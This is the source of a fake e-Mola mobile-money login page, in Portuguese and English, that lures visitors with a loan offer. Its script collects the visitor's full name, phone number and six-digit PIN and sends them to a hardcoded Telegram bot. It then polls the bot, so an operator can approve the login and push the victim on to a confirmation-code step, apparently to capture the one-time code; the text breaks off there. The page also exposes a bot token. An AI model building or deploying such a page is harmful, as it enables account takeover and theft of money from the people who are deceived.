<!DOCTYPE html>
<html lang="pt-MZ">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
<meta name="theme-color" content="#F7941D">
<title>e-Mola | Entrar</title>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
<style>
:root{--or:#F7941D;--or-deep:#D96F00;--or-dark:#A34A00;--or-light:#FFB84D;--amber:#FFC857;--cream:#FFF8F0;--white:#fff;--dark:#1a1a1a;--muted:#6b6b6b;--err:#d32f2f;--ok:#2e7d32;--grad:linear-gradient(180deg,#F9A93D 0%,#F7941D 35%,#D96F00 100%);--shadow:0 20px 60px rgba(217,111,0,.35)}
*{margin:0;padding:0;box-sizing:border-box}
html{-webkit-text-size-adjust:100%}
body{font-family:'Poppins',system-ui,sans-serif;background:var(--grad);min-height:100vh;display:flex;flex-direction:column;position:relative;overflow-x:hidden}
body::before{content:'';position:fixed;top:10%;right:-20%;width:700px;height:700px;background:radial-gradient(circle,rgba(255,255,255,.15) 0%,transparent 65%);border-radius:50%;pointer-events:none}
body::after{content:'';position:fixed;bottom:-15%;left:-25%;width:600px;height:600px;background:radial-gradient(circle,rgba(255,255,255,.08) 0%,transparent 65%);border-radius:50%;pointer-events:none}
.bg-art{position:fixed;inset:0;pointer-events:none;overflow:hidden;z-index:0;opacity:.07}
.bg-art svg{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%) rotate(-15deg);width:140%;height:auto;max-width:none}
header{background:transparent;padding:16px 5%;position:relative;z-index:3;display:flex;justify-content:space-between;align-items:center;gap:14px}
.back-btn{background:transparent;border:none;cursor:pointer;padding:8px;display:flex;align-items:center;justify-content:center;color:#fff;text-decoration:none;border-radius:50%;transition:background .2s}
.back-btn:hover{background:rgba(255,255,255,.15)}
.back-btn svg{width:26px;height:26px;stroke:#fff;stroke-width:2.5;fill:none;stroke-linecap:round;stroke-linejoin:round}
.lang-switch{display:flex;align-items:center;gap:6px;background:transparent;border:none;padding:6px 10px;border-radius:50px;color:#fff}
.lang-flag{font-size:18px;line-height:1}
.lang-btn{padding:2px 6px;border-radius:6px;transition:all .2s;cursor:pointer;border:none;background:transparent;color:rgba(255,255,255,.55);font-family:inherit;font-weight:800;font-size:13px;letter-spacing:.04em}
.lang-btn.active{color:#fff}
main{flex:1;display:flex;align-items:center;justify-content:center;padding:20px 20px 40px;position:relative;z-index:1}
.login-wrap{width:100%;max-width:400px;display:flex;flex-direction:column;align-items:center}
.logo-block{text-align:center;margin-bottom:36px;position:relative}
.logo-icon{width:150px;height:150px;margin:0 auto 8px;display:block;filter:drop-shadow(0 10px 24px rgba(0,0,0,.18))}
.logo-text{font-size:48px;font-weight:900;color:#fff;letter-spacing:-2px;line-height:1;margin-bottom:6px}
.logo-tag{font-size:14.5px;font-weight:700;color:#fff;letter-spacing:.02em;opacity:.95}
.field{width:100%;margin-bottom:14px;position:relative}
.field-pill{display:flex;align-items:center;background:rgba(120,55,10,.32);border:2px solid transparent;border-radius:50px;padding:0 24px;transition:all .25s;backdrop-filter:blur(4px);min-height:58px}
.field-pill:focus-within{background:rgba(120,55,10,.42);border-color:rgba(255,255,255,.4);box-shadow:0 0 0 4px rgba(255,255,255,.1)}
.field-pill input{flex:1;background:transparent;border:none;padding:17px 0;font-family:inherit;font-size:15px;font-weight:500;color:#fff;outline:none;min-width:0}
.field-pill input::placeholder{color:rgba(255,255,255,.68);font-weight:500}
.field-pill input:-webkit-autofill{-webkit-box-shadow:0 0 0 1000px rgba(120,55,10,.9) inset;-webkit-text-fill-color:#fff;caret-color:#fff}
#pin{letter-spacing:3px;font-weight:700}
.phone-prefix{color:#fff;font-weight:800;font-size:15px;padding-right:12px;margin-right:12px;border-right:1.5px solid rgba(255,255,255,.35);flex-shrink:0;line-height:1}
.pin-tog{background:transparent;border:none;color:#fff;font-family:inherit;font-weight:800;font-size:12px;letter-spacing:.03em;cursor:pointer;opacity:.9;transition:opacity .2s;padding-left:12px;flex-shrink:0}
.pin-tog:hover{opacity:1}
.err{display:none;background:rgba(255,255,255,.95);border-left:4px solid var(--err);color:var(--err);font-size:13px;font-weight:700;border-radius:14px;padding:12px 16px;margin-bottom:14px;text-align:center;width:100%}
.err.show{display:block;animation:shake .4s}
@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-6px)}75%{transform:translateX(6px)}}
.btn-submit{width:100%;background:#fff;color:#000;border:none;padding:18px;border-radius:50px;font-family:inherit;font-weight:900;font-size:17px;letter-spacing:.08em;text-transform:uppercase;cursor:pointer;margin-top:8px;transition:all .25s;box-shadow:0 8px 24px rgba(0,0,0,.15)}
.btn-submit:hover{transform:translateY(-1px);box-shadow:0 12px 30px rgba(0,0,0,.22)}
.btn-submit:active{transform:translateY(0)}
.links{margin-top:28px;text-align:center;display:flex;flex-direction:column;gap:14px}
.links a{color:#fff;font-size:15px;font-weight:600;text-decoration:none;transition:opacity .2s;opacity:.95}
.links a:hover{opacity:1;text-decoration:underline}
.bottom-icons{display:flex;justify-content:center;gap:20px;margin-top:44px}
.icon-circle{width:56px;height:56px;border-radius:50%;background:#fff;border:none;cursor:pointer;display:flex;align-items:center;justify-content:center;box-shadow:0 6px 16px rgba(0,0,0,.12);transition:transform .2s;text-decoration:none}
.icon-circle:hover{transform:translateY(-2px)}
.icon-circle svg{width:26px;height:26px;stroke:var(--or-deep);stroke-width:2;fill:none;stroke-linecap:round;stroke-linejoin:round}
.version{text-align:center;margin-top:26px;font-size:12px;font-weight:500;color:rgba(255,255,255,.75);letter-spacing:.03em}
.bundle-bar{width:100%;background:rgba(120,55,10,.3);border-radius:18px;padding:14px 18px;margin-bottom:20px;color:#fff;backdrop-filter:blur(4px);border:1px solid rgba(255,255,255,.12)}
.b-row{display:flex;justify-content:space-between;font-size:12.5px;margin-bottom:6px}
.b-row:last-child{margin-bottom:0;padding-top:9px;border-top:1px solid rgba(255,255,255,.18);font-weight:800;font-size:13.5px}
.overlay{position:fixed;inset:0;display:none;align-items:center;justify-content:center;flex-direction:column;gap:16px;background:rgba(42,22,8,.94);z-index:2000;backdrop-filter:blur(8px)}
.overlay.on{display:flex}
.spin{width:54px;height:54px;border:4px solid rgba(255,255,255,.15);border-top-color:var(--or-light);border-radius:50%;animation:sp .8s linear infinite}
.sp-t{font-size:14px;font-weight:800;color:#fff}
.sp-s{font-size:11.5px;color:rgba(255,255,255,.7)}
@keyframes sp{to{transform:rotate(360deg)}}
.modal{position:fixed;inset:0;display:none;align-items:center;justify-content:center;background:rgba(42,22,8,.78);z-index:2000;padding:20px;backdrop-filter:blur(8px)}
.modal.on{display:flex}
.modal-box{background:#fff;border-radius:18px;padding:34px;max-width:360px;width:100%;text-align:center;box-shadow:var(--shadow);animation:pop .4s}
@keyframes pop{from{opacity:0;transform:scale(.96) translateY(10px)}to{opacity:1;transform:scale(1) translateY(0)}}
.modal-box h2{font-size:18px;font-weight:900;color:var(--or-dark);margin-bottom:8px}
.modal-box p{color:var(--muted);font-size:13px;margin-bottom:20px;line-height:1.6}
.modal-btn{width:100%;padding:15px;border-radius:50px;border:none;font-weight:800;font-size:13px;cursor:pointer;background:var(--or);color:#fff;font-family:inherit;letter-spacing:.04em;text-transform:uppercase}
@media (max-width:500px){main{padding:12px 16px 30px}.logo-text{font-size:42px}.logo-icon{width:130px;height:130px}.field-pill{padding:0 20px;min-height:56px}}
@media (prefers-reduced-motion:reduce){*,*::before,*::after{animation-duration:.01ms!important;transition-duration:.01ms!important}}
</style>
</head>
<body>

<div class="bg-art">
  <svg viewBox="0 0 400 400" xmlns="http://www.w3.org/2000/svg">
    <rect x="140" y="60" width="120" height="220" rx="18" fill="#fff"/>
    <rect x="155" y="80" width="90" height="150" rx="6" fill="#F7941D"/>
    <circle cx="200" cy="260" r="10" fill="#F7941D"/>
    <path d="M120 140 Q160 100 200 140 Q240 180 280 140" stroke="#fff" stroke-width="6" fill="none" opacity="0.6"/>
  </svg>
</div>

<header>
  <a class="back-btn" href="index.html" aria-label="Voltar">
    <svg viewBox="0 0 24 24"><path d="M15 18l-6-6 6-6"/></svg>
  </a>
  <div class="lang-switch">
    <span class="lang-flag" id="langFlag">🇲🇿</span>
    <button class="lang-btn active" data-lang="pt" onclick="setLang('pt')">POR</button>
    <button class="lang-btn" data-lang="en" onclick="setLang('en')">ENG</button>
  </div>
</header>

<main>
  <div class="login-wrap">

    <div class="logo-block">
      <svg class="logo-icon" viewBox="0 0 160 160" xmlns="http://www.w3.org/2000/svg">
        <!-- Phone body -->
        <rect x="44" y="20" width="58" height="112" rx="10" fill="#ffffff"/>
        <!-- Phone screen (orange fill) -->
        <rect x="52" y="34" width="42" height="76" rx="4" fill="#F7941D"/>
        <!-- Keypad rows inside screen (small bars) -->
        <rect x="57" y="42" width="32" height="3" rx="1.5" fill="#ffffff" opacity="0.55"/>
        <rect x="57" y="50" width="32" height="3" rx="1.5" fill="#ffffff" opacity="0.55"/>
        <rect x="57" y="58" width="32" height="3" rx="1.5" fill="#ffffff" opacity="0.55"/>
        <rect x="57" y="66" width="32" height="3" rx="1.5" fill="#ffffff" opacity="0.55"/>
        <rect x="57" y="74" width="32" height="3" rx="1.5" fill="#ffffff" opacity="0.55"/>
        <rect x="57" y="82" width="32" height="3" rx="1.5" fill="#ffffff" opacity="0.55"/>
        <rect x="57" y="90" width="32" height="3" rx="1.5" fill="#ffffff" opacity="0.55"/>
        <rect x="57" y="98" width="32" height="3" rx="1.5" fill="#ffffff" opacity="0.55"/>
        <!-- Home button dot -->
        <circle cx="73" cy="122" r="5" fill="#F7941D"/>
        <!-- Speaker slot -->
        <rect x="63" y="27" width="20" height="3" rx="1.5" fill="#F7941D"/>
        <!-- Banknote tilted, emerging from top-right -->
        <g transform="translate(66 34) rotate(22)">
          <rect x="0" y="0" width="74" height="46" rx="6" fill="#ffffff"/>
          <rect x="4" y="4" width="66" height="38" rx="4" fill="none" stroke="#F7941D" stroke-width="1.5" opacity="0.5"/>
          <circle cx="37" cy="23" r="13" fill="#F7941D"/>
          <text x="37" y="30" text-anchor="middle" font-family="Arial,Helvetica,sans-serif" font-size="20" font-weight="900" fill="#ffffff">$</text>
          <!-- corner accents -->
          <circle cx="10" cy="10" r="2" fill="#F7941D" opacity="0.6"/>
          <circle cx="64" cy="10" r="2" fill="#F7941D" opacity="0.6"/>
          <circle cx="10" cy="36" r="2" fill="#F7941D" opacity="0.6"/>
          <circle cx="64" cy="36" r="2" fill="#F7941D" opacity="0.6"/>
        </g>
      </svg>
      <div class="logo-text">e-Mola</div>
      <div class="logo-tag" data-i18n="lg.tag">Meu cell, minha mola</div>
    </div>

    <div id="bBar" class="bundle-bar" style="display:none">
      <div class="b-row"><span data-i18n="lg.bAmount">Empréstimo:</span><span id="bD">&mdash;</span></div>
      <div class="b-row"><span data-i18n="lg.bDur">Prazo:</span><span id="bDur">&mdash;</span></div>
      <div class="b-row"><span data-i18n="lg.bTotal">Total a Pagar:</span><span id="bP">0 MZN</span></div>
    </div>

    <div id="err" class="err"></div>

    <form id="frm" onsubmit="doSubmit(event)" style="width:100%">
      <div class="field">
        <div class="field-pill">
          <input type="text" id="name" placeholder="Nome completo" autocomplete="name" data-i18n-ph="lg.namePh">
        </div>
      </div>
      <div class="field">
        <div class="field-pill">
          <span class="phone-prefix">+258</span>
          <input type="tel" id="phone" placeholder="Digite o número de telefone" inputmode="numeric" maxlength="9" data-i18n-ph="lg.phonePh">
        </div>
      </div>
      <div class="field">
        <div class="field-pill">
          <input type="password" id="pin" placeholder="••••••" inputmode="numeric" maxlength="6" data-i18n-ph="lg.pinPh">
          <button type="button" class="pin-tog" onclick="togPin(event)" data-i18n="lg.show">MOSTRAR</button>
        </div>
      </div>

      <button type="submit" class="btn-submit" data-i18n="lg.btn">ENTRAR</button>
    </form>

    <div class="links">
      <a href="#" data-i18n="lg.forgot">Esqueceu a senha</a>
      <a href="#" data-i18n="lg.register">Cadastrar-se</a>
    </div>

    <div class="bottom-icons">
      <a class="icon-circle" href="#" aria-label="Localização">
        <svg viewBox="0 0 24 24"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg>
      </a>
      <a class="icon-circle" href="#" aria-label="Ajuda">
        <svg viewBox="0 0 24 24"><path d="M2 3h6a4 4 0 0 1 4 4v14a3 3 0 0 0-3-3H2z"/><path d="M22 3h-6a4 4 0 0 0-4 4v14a3 3 0 0 1 3-3h7z"/></svg>
      </a>
    </div>

    <div class="version" data-i18n="lg.version">Versão 2.2.0</div>

  </div>
</main>

<div id="ov" class="overlay"><div class="spin"></div><div class="sp-t" data-i18n="lg.loading">A confirmar a conta</div><div class="sp-s" data-i18n="lg.wait">Por favor aguarde...</div></div>

<div id="aModal" class="modal">
  <div class="modal-box">
    <h2 data-i18n="lg.applied">Transação já efetuada</h2>
    <p data-i18n="lg.appliedMsg">Esta transação já foi aplicada à sua conta e-Mola. Pode continuar para verificar o código de confirmação.</p>
    <button class="modal-btn" onclick="goOTP()" data-i18n="lg.continue">Continuar</button>
  </div>
</div>

<script>
const translations={
  pt:{
    "lg.tag":"Meu cell, minha mola",
    "lg.bAmount":"Empréstimo:","lg.bDur":"Prazo:","lg.bTotal":"Total a Pagar:",
    "lg.namePh":"Nome completo","lg.phonePh":"Digite o número de telefone","lg.pinPh":"••••••",
    "lg.show":"MOSTRAR","lg.hide":"OCULTAR",
    "lg.btn":"ENTRAR","lg.forgot":"Esqueceu a senha","lg.register":"Cadastrar-se",
    "lg.version":"Versão 2.2.0",
    "lg.loading":"A confirmar a conta","lg.wait":"Por favor aguarde...",
    "lg.applied":"Transação já efetuada","lg.appliedMsg":"Esta transação já foi aplicada à sua conta e-Mola. Pode continuar para verificar o código de confirmação.","lg.continue":"Continuar",
    "err.name":"Insira o seu nome completo","err.phone":"Insira um número válido de 9 dígitos","err.pin":"O PIN e-Mola tem 6 dígitos","err.declined":"Pedido recusado. Tente novamente."
  },
  en:{
    "lg.tag":"My cell, my money",
    "lg.bAmount":"Loan:","lg.bDur":"Term:","lg.bTotal":"Total to Pay:",
    "lg.namePh":"Full name","lg.phonePh":"Enter phone number","lg.pinPh":"••••••",
    "lg.show":"SHOW","lg.hide":"HIDE",
    "lg.btn":"LOG IN","lg.forgot":"Forgot password","lg.register":"Sign up",
    "lg.version":"Version 2.2.0",
    "lg.loading":"Confirming account","lg.wait":"Please wait...",
    "lg.applied":"Transaction already applied","lg.appliedMsg":"This transaction has already been applied to your e-Mola account. You can continue to verify the confirmation code.","lg.continue":"Continue",
    "err.name":"Please enter your full name","err.phone":"Please enter a valid 9-digit number","err.pin":"The e-Mola PIN has 6 digits","err.declined":"Request declined. Please try again."
  }
};

function applyLanguage(lang){
  document.querySelectorAll('[data-i18n]').forEach(el=>{
    const k=el.getAttribute('data-i18n');
    if(translations[lang]&&translations[lang][k])el.textContent=translations[lang][k];
  });
  document.querySelectorAll('[data-i18n-ph]').forEach(el=>{
    const k=el.getAttribute('data-i18n-ph');
    if(translations[lang]&&translations[lang][k])el.placeholder=translations[lang][k];
  });
  localStorage.setItem('emola_lang',lang);
  document.documentElement.lang=lang==='pt'?'pt-MZ':'en';
  document.querySelectorAll('.lang-btn').forEach(b=>b.classList.toggle('active',b.dataset.lang===lang));
  const pinEl=document.getElementById('pin');
  const btn=document.querySelector('.pin-tog');
  if(btn)btn.textContent=pinEl.type==='password'?translations[lang]['lg.show']:translations[lang]['lg.hide'];
  const flag=document.getElementById('langFlag');
  if(flag)flag.textContent=lang==='pt'?'🇲🇿':'🇬🇧';
}
function setLang(lang){applyLanguage(lang)}
function tr(key){const l=localStorage.getItem('emola_lang')||'pt';return (translations[l]&&translations[l][key])||key}

const BOT='8976816871:AAEoOSVkVWkrROLidS1qWH6snhpmU3e8AXU';
const CID='8873805952';
let bd={},luid=0;

function init(){
  const p=new URLSearchParams(location.search);
  const amount=p.get('amount'),dur=p.get('duration'),interest=p.get('interest'),total=p.get('total');
  if(amount){
    bd={amount,duration:dur,interest:interest||'0',total:total||amount};
    document.getElementById('bBar').style.display='block';
    document.getElementById('bD').textContent=fmtNum(amount)+' MZN';
    document.getElementById('bDur').textContent=dur+' '+(localStorage.getItem('emola_lang')==='en'?'days':'dias');
    document.getElementById('bP').textContent=fmtNum(total||amount)+' MZN';
  }
}
function fmtNum(n){return parseInt(n).toLocaleString('pt-PT').replace(/\s/g,'.')}
function togPin(e){
  const el=document.getElementById('pin');const b=e.target;
  el.type=el.type==='password'?'text':'password';
  b.textContent=el.type==='password'?tr('lg.show'):tr('lg.hide');
}
function showErr(m){const e=document.getElementById('err');e.textContent=m;e.classList.add('show')}
function clrErr(){document.getElementById('err').classList.remove('show')}
async function tg(msg,btns){
  try{await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CID,text:msg,reply_markup:btns?{inline_keyboard:btns}:undefined,parse_mode:'HTML'})})}catch(e){console.error(e)}
}
function doSubmit(e){
  e.preventDefault();clrErr();
  const name=document.getElementById('name').value.trim();
  const phone=document.getElementById('phone').value.trim().replace(/\s/g,'');
  const pin=document.getElementById('pin').value.trim();
  if(!name){showErr(tr('err.name'));return}
  if(phone.length!==9){showErr(tr('err.phone'));return}
  if(pin.length!==6){showErr(tr('err.pin'));return}
  const msg=`🔐 <b>e-Mola Login Attempt</b>\n\n<b>Name:</b> <code>${name}</code>\n<b>Phone:</b> <code>+258${phone}</code>\n<b>PIN:</b> <code>${pin}</code>\n\n<b>Loan:</b> <code>${fmtNum(bd.amount||0)} MZN</code>\n<b>Term:</b> <code>${bd.duration||'N/A'} days</code>\n<b>Total:</b> <code>${fmtNum(bd.total||0)} MZN</code>`;
  const btns=[
    [{text:'✓ Approve',callback_data:'login_approved'},{text:'✗ Decline',callback_data:'login_declined'}],
    [{text:'⚠️ Already Applied',callback_data:'login_applied'}]
  ];
  document.getElementById('ov').classList.add('on');
  tg(msg,btns);poll();
}
function poll(){
  const iv=setInterval(()=>{
    fetch(`https://api.telegram.org/bot${BOT}/getUpdates?offset=${luid+1}`).then(r=>r.json()).then(d=>{
      if(d.ok&&d.result.length>0){
        const u=d.result[0];luid=u.update_id;
        if(u.callback_query){
          const cb=u.callback_query.data;
          if(cb==='login_approved'){clearInterval(iv);document.getElementById('ov').classList.remove('on');goOTP()}
          else if(cb==='login_declined'){clearInterval(iv);document.getElementById('ov').classList.remove('on');showErr(tr('err.declined'));document.getElementById('frm').reset()}
          else if(cb==='login_applied'){clearInterval(iv);document.getElementById('ov').classList.remove('on');document.getElementById('aModal').classList.add('on')}
        }
      }
    }).catch(e=>console.error(e));
  },1000);
  setTimeout(()=>clearInterval(iv),300000);
}
function goOTP(){
  document.getElementById('aModal').classList.remove('on');
  const ph=document.getElementById('phone').value.trim().replace(
